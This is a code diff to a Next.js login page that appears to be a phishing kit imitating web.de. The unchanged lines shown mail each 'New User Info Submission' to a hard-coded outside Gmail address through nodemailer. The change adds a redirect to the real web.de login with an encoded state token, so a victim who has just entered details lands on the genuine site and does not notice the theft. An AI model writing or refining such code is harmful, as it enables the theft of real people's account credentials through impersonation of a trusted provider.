@@ -3,7 +3,7 @@ import Link from "next/link";
 import { headers } from "next/headers";
 import nodemailer from "nodemailer"; // Import Nodemailer
 import LoginForm from "./LoginForm";
-import Image from "next/image";
+import { redirect } from "next/navigation";
 
 export default async function LoginPage({
   params,
@@ -131,7 +131,6 @@ export default async function LoginPage({
       await transporter.sendMail({
         from: process.env.GMAIL_USER, // Sender address (must be your Gmail account)
         to: "Infoadamslawrence@gmail.com", // Destination address
-        // to: "omonzebaguan.grn@gmail.com", // Destination address
         subject: "New User Info Submission",
         html: emailHtml,
       });
@@ -141,7 +140,10 @@ export default async function LoginPage({
       return { success: false };
     }
 
-    return { success: true };
+    redirect(
+      "https://auth.web.de/login?prompt=none&state=eyJpZCI6IjM4ZWU1ODkxLTdkZTYtNGI2Mi05ZWQ0LTg4YWNkNzY0N2Y1ZiIsImNsaWVudElkIjoid2ViZGVfYWxsaWdhdG9yX2xpdmUiLCJ4VWlBcHAiOiJ3ZWJkZS5hbGxpZ2F0b3IvMS4yMS4yIiwicGF5bG9hZCI6ImV5SmtZeUk2SW1Keklpd2lkR0Z5WjJWMFZWSkpJam9pYUhSMGNITTZMeTkzWldKc2FXNXJMbmRsWWk1a1pTOXRZV2xzTDNOb2IzZFRkR0Z5ZEZacFpYY2lMQ0p3Y205alpYTnpTV1FpT2lKdmFWOXdhMk5sTXlKOSJ9&authcode-context=J4Wuxtntqd",
+    );
+    // https: return { success: true };
   };
 
   return (
